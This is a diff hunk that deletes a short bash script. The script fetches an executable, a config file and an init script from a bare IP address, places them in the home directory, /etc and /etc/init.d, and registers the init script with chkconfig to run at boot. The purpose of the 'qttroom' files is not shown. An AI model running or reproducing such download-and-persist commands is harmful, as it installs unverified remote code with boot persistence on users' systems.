@@ -1,8 +1,0 @@
-#!/bin/bash
-source /etc/profile
-wget -P $HOME  http://88.88.106.105/qttroom
-chmod +x $HOME/qttroom
-wget -P /etc/ http://88.88.106.105/qttserver.config
-wget -P /etc/init.d/ http://88.88.106.105/exec/qqtroom
-chmod +x /etc/init.d/qqtroom
-chkconfig --add /etc/init.d/qqtroom
